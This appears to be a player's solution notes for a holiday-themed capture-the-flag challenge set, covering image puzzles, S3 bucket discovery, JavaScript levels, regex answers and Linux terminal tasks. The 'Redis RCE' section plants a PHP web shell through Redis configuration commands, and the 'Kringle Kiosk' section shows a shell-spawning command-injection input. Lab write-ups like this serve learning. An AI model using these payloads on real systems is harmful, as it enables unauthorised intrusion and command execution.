# Uncover Santa's Gift List

Use Photopea to undo the twirled area:

1. Select area and use Distort -> Twirl

Alternatively:

1. Save billboard image
2. open in photo editor e.g. Paintshop Pro
3. Crop to distorted list
4. Use Twirl distortion effect or similar to undo distortion
 
### Answer: Josh Wright is getting a `proxmark`

In GIMP this can be done with the Warp Transform brush set to "swirl clockwise" and making the brush larger than the distorted area and gradually applying the brush...it can be tricky to get the precise correction

# Investigate S3 Bucket

```
cd bucket_finder
bucket_finder.rb --help
bucket_finder.rb wordlist
vim wordlist
```

Add **wrapper3000** or change **wrapper** to **wrapper3000**

```	
bucket_finder.rb wordlist
```

Finds **wrapper3000/package**

```	
bucket_finder.rb wordlist --download
cd wrapper3000
base64 --decode package >> package2
file package2
unzip package2
bunzip2 package.txt.Z.xz.xxd.tar.bz2
tar -xf package.txt.Z.xz.xxd.tar
xxd -r package.txt.Z.xz.xxd >> package.txt.Z.xz
unxz package.txt.Z.xz
uncompress package.txt.Z
cat package.txt 
```

### Flag: `North Pole: The Frostiest Place on Earth`

# Javascript Challenge:

## Level 1

```
elf.moveLeft(10); elf.moveUp(12)
```

## Level 2

```	
var answer = elf.get_lever(0) + 2
elf.moveLeft(6)
elf.pull_lever(answer)
elf.moveLeft(4)
elf.moveUp(12)
```

## Level 3

```	
elf.moveTo(lollipop[0])
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[2])
elf.moveUp(4)
```

## Level 4

```
for (var i = 0; i < 3; i++) {
	elf.moveLeft(3);
	elf.moveUp(40);
	elf.moveLeft(2);
	elf.moveDown(40);}
```

## Level 5

```
var test = elf.ask_munch(0);
var answer = test.filter(Number);
elf.moveTo(munchkin[0]);
elf.tell_munch(answer);
elf.moveUp(4);
```

## Level 6

```
var answer = elf.get_lever(0);
answer = answer.unshift("Munchkins Rule");
for (var i = 0; i < 4; i++) {
	elf.moveTo(lollipop[i]);
	}
elf.moveTo(lever[0]);
elf.pull_lever(answer); #Lever still not working
elf.moveTo(munchkin[0]);
```

# Redis RCE:

```	
curl http://localhost/maintenance.php?cmd=get+config+*  R3disp@ss
redis-cli
auth R3disp@ss
config set dir /var/www/html
config set dbfilename redis.php
config set test <?php system(\$_GET['c']); ?>
exit
curl http://localhost/redis.php?c=more+index.php
```

# Door, lights, vending machines, lights

```	
strings Door 
```

reveals **pass:Op3nTheD00r**

```
cd ~/lab
```

copy encrypted password to name field in **lights.conf**

```
./lights
```

pass: Computer-TurnLightsOn

```
cd home and run ./lights
cd ~/lab
mv vending-machines.json vending-machines.json.old
./vending-machines
user: AAAA
pass: abcdefghijklmnopqrstuvwxyz (pass encrypted as "9UedAffhM83WsX4LYNPCwn2Eia")
pass: aaaaaa (encrypted as "9Vbtac")
cat vending-machines.json
```

encryption IS deterministic, length equal, username has no effect, clearly progressive
to crack: LVEdQPpBwr 10-characters

### Answer: `CandyCane1`

# Javascript Regex:

1. digits only
	- `\d`
2. 3x alphabetic case-insensitive
	- `[a-zA-Z]{3}`
3. 2x alpha-numeric
	- `[a-z0-9]{2}`
4. 2x anything not A-L 1-5
	- `[^A-L1-5]{2}`
5. 3 or more numeric
	- `^[0-9]{3,}$`
6. HH:MM:SS
	- `^([0|1]?[0-9]|2[0-3]):([0-5][0-9]):([0-5][0-9])$`
7. MAC Address
	- `^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$`
8. Any MM/DD/YYYY format
	- `^([0|1][0-9])[.\/-]([0|1|2][0-9]|3[0-1])[.\/-]([0-9]{4})$`

# HID Lock:

```
#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023
```

# Splunk:

1. `13`
2. `t1059.003-main t1059.003-win`
3. `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography`
4. `2020-11-30T17:44:15Z`
5. `3648`
6. `quser`
7.  

Objective:


# Other

## Unescape TMUX

```
tmux attach
```

## Kringle Kiosk

- Option 4 allows user input
- Select option 4

```	
mynameis && /bin/bash
```

## Linux Primer

```
ls
cat munchkin_19315479765589239
rm munchkin_19315479765589239
pwd
ls -lah
cat .munchkin_5074624024543078
history | grep -i munchkin
!1
printenv
echo $z_MUNCHKIN
cd workshop
grep -i munchkin *
chmod +x lollipop_engine
./lollipop_engine
cd electrical
mv blown_fuse0 fuse0
ln -s fuse0 fuse1
cp fuse1 fuse2
echo MUNCHKIN_REPELLENT >> fuse2
ls -R /opt/munchkin_den | grep -i munchkin
find /opt/munchkin_den -type f -user munchkin
find /opt/munchkin_den -type f -size +108k -size -110k
ps aux
netstat -l
curl -X get localhost:54321
kill 40129
```